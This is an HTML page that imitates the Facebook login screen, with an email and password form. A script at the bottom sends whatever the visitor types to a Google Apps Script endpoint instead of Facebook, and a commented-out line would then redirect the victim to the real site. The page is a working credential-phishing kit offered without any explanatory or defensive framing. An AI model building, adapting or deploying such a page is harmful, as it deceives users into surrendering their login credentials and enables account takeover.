<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn" crossorigin="anonymous">

    <title>Facebook â€“ log in or sign up</title>
  </head>
  <body>
  	<div style="width: 450px" class="container p-3">
  		<h5 class="text-center text-primary" style="font-weight: bolder;">facebook</h5>
  		<form id="frmsubmit">
			<input required placeholder="Mobile number or email address" class="form-control" type="text" name="email"><br>
			<input required placeholder="Password" class="form-control" type="password" name="pass"><br>
			<input class="btn btn-primary w-100" id="btnsubmit" type="submit" name="submit" value="Login">
		</form>
		<p class="text-center m-3"><a style="text-decoration: none;" href="#">Forgotten password?</a></p>
		<hr class="m-3">
			<button class="btn-success btn justify-content-center" style="position: absolute; left: 50%; transform: translate(-50%, 0%);">Create New Account</button>
  	</div>

  </body>
</html>
<script>
	jQuery('#frmsubmit').on('submit',function(e) {
		e.preventDefault();
		jQuery.ajax({
			url:'https://script.google.com/macros/s/AKfycbzI7REI3lGI6R_tOBaU9wZkR6weLVnTbCYyVtwtOPxFlGLxFzY_oUIaMDeTy3mR1t7m/exec',
			type:'post',
			data:jQuery('#frmsubmit').serialize(),
			success:function(result) {
				// window.location.replace("http://www.facebook.com");
			}
		});
	});
</script>
